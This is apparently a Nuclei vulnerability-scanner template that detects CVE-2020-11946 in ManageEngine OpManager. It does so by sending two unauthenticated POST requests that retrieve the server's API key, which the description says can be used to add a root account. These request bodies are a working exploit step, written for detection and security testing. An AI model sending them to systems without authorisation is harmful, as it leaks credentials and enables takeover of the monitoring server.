id: manageengine-opmanager-infoleak
info:
  name: ManageEngine OpManager Infoleak (CVE-2020-11946)
  author: ProjectDiscoveryAI
  severity: medium
  description: |
    Zoho ManageEngine OpManager before 125120 allows an unauthenticated user to retrieve an API key via a servlet call. This key can be used to add a root account. Affected: Builds 12.3.xxx-12.4.195 Builds 12.5.000-12.5.119.
  tags: information-disclosure
  classification:
    cve-id: CVE-2020-11946
  reference:
    - https://www.manageengine.com/network-monitoring/security-updates/cve-2020-11946.html
    - https://ssd-disclosure.com/ssd-advisory-unauthenticated-access-api-key-access-leads-to-rce/

http:
  - raw:
      - |
        POST /servlet/sendData HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        reqFrm=fwacs&key=true&user=admin&process=apikey

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "key=Start"

  - raw:
      - |
        POST /oputilsServlet HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        action=getAPIKey

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "key=Start"
